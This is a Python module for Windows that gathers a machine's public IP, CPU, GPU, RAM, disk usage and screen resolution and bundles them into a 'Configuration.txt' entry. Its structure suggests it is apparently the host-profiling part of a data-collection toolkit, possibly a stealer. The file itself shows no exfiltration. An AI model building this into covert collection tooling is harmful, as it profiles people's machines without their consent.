import platform
from os import path
from json import loads
from string import ascii_uppercase
from urllib.request import urlopen
from ctypes import windll, sizeof, byref, c_wchar_p
from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE

from helper.helpers.dataclasses import Data
from helper.helpers.config import SystemConfig
from helper.helpers import DisplayDevice, MemoryStatusEx, UlargeInteger, functions, MemoryStorage


class System:
    """
    Collects all system data.
    """
    def __init__(self, folder: str):

        self.__file = path.join(folder, "Configuration.txt")
        self.__config = SystemConfig()
        self.__storage = MemoryStorage()

    @staticmethod
    def get_video_card() -> str:
        """
        Gets the video card name.

        Parameters:
        - None.

        Returns:
        - str: Video card name.
        """
        try:

            display_device = DisplayDevice()
            display_device.cb = sizeof(DisplayDevice)

            user32 = windll.user32
            result = user32.EnumDisplayDevicesW(None, 0, byref(display_device), 0)

            if not result:
                return "Unknown"

            return display_device.DeviceString.strip()

        except:
            return "Unknown"

    @staticmethod
    def __get_ram() -> str:
        """
        Gets information about RAM.

        Parameters:
        - None.

        Returns:
        - str: RAM data table.
        """
        try:

            memory_status = MemoryStatusEx()
            memory_status.dwLength = sizeof(memory_status)

            kernel32 = windll.kernel32

            kernel32.GlobalMemoryStatusEx(byref(memory_status))

            total = str(round(memory_status.ullTotalPhys / (1024 ** 3), 2))
            used = str(round((memory_status.ullTotalPhys - memory_status.ullAvailPhys) / (1024 ** 3), 2))
            free = str(round(memory_status.ullAvailPhys / (1024 ** 3), 2))

            return "\n".join(line for line in functions.create_table(["Used GB", "Free GB", "Total GB"], [[used, free, total]]))

        except:
            return "Unknown"

    @staticmethod
    def __get_disks_info() -> str:
        """
        Gets information about disks.

        Parameters:
        - None.

        Returns:
        - str: Disks data table.
        """
        try:

            kernel32 = windll.kernel32

            drives = []
            bitmask = kernel32.GetLogicalDrives()

            for letter in ascii_uppercase:
                if bitmask & 1:
                    drives.append(f"{letter}:\\")
                bitmask >>= 1

            result = []

            for drive in drives:

                total_bytes = UlargeInteger()
                free_bytes = UlargeInteger()
                available_bytes = UlargeInteger()
                success = kernel32.GetDiskFreeSpaceExW(c_wchar_p(drive), byref(available_bytes), byref(total_bytes), byref(free_bytes))

                if not success:
                    continue

                total = ((total_bytes.HighPart * (2 ** 32)) + total_bytes.LowPart) / (1024 ** 3)
                free = ((free_bytes.HighPart * (2 ** 32)) + free_bytes.LowPart) / (1024 ** 3)
                used = total - free

                result.append([drive, round(used, 2), round(free, 2), round(total, 2)])

            return "\n".join(line for line in functions.create_table(["Drive", "Used GB", "Free GB", "Total GB"], result))

        except:
            return "Unknown"

    @staticmethod
    def __get_processor_name() -> str:
        """
        Gets the processor name.

        Parameters:
        - None.

        Returns:
        - str: Processor name.
        """
        try:
            return QueryValueEx(OpenKey(HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"), "ProcessorNameString")[0]
        except:
            return "Unknown"

    def __get_ip(self) -> str:
        """
        Gets the IP address.

        Parameters:
        - None.

        Returns:
        - str: IP address.
        """
        try:
            ip = loads(urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8"))["ip"]
        except:
            ip = "Unknown"

        return ip

    def __get_system_info(self) -> None:
        """
        Collects all system data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        user32 = windll.user32
        data = self.__config.SystemData

        net_info = self.__get_ip()
        machine_type = platform.machine()
        os_info = platform.platform()
        network_name = platform.node()
        cpu_info = self.__get_processor_name()
        gpu_info = self.get_video_card()
        ram_info = self.__get_ram()
        disk_info = self.__get_disks_info()
        monitors_info = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"

        self.__storage.add_from_memory(
            self.__file,
            data.format(
                self.__config.User,
                net_info,
                machine_type,
                os_info,
                network_name,
                monitors_info,
                cpu_info,
                gpu_info,
                ram_info,
                disk_info
            )
        )

        self.__storage.add_data("User", self.__config.User)
        self.__storage.add_data("IP", net_info)
        self.__storage.add_data("OS", os_info)

    def run(self) -> Data:
        """
        Launches the system data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_system_info()

            return self.__storage.get_data()

        except Exception as e:
            pass
